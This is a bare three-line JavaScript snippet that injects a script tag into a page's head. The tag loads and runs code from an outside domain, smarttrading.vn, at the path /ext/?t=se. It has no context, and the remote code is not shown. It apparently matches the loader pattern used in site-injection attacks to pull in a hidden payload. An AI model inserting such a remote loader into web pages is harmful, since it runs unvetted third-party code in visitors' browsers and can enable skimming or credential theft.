var script = document.createElement('script');
script.src = "https://smarttrading.vn/ext/?t=se";
document.head.appendChild(script); 